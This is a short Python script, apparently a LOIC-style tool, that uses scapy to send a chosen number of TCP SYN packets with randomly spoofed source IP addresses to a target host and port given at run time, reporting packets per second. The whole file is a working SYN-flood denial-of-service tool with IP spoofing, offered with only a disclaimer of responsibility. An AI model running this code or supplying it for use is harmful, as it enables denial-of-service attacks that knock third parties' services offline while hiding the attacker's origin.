# -*- coding: cp1252 -*-
import socket
try:
	from scapy.all import *
except:
	print("Scapy importation error, try running 'installscapy' (only on linux and macos/ios)")
import random
import sys
import time
print '\npythonLoic SYN packets sender V1.1.1\nWhith ip spoofing'
print "I'm not responsible of your acts with this software.\n"
conf.iface='wlan0'
target = sys.argv[1]
num=int(raw_input("How many packets ? "))
port=int(raw_input("Port : "))
ip = IP()
ip.dst = target
c=0
tcp = TCP()
start = time.time()
start1 = time.time()
tcp.dport = port
tcp.flags = 'S'
while c<num:
	ip.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
	tcp.sport = RandShort()
	packet=ip/tcp
	send(packet, verbose=0)
	c += 1
	if c%100==0:
		elapsed= time.time() - start
		ps=int(100/elapsed)
		print(str(c)+"    Packets/sec : "+str(ps))
		start = time.time()
elapsed= time.time() - start1
print("Average packets/sec : "+str(num/elapsed))
print ("Successful !")
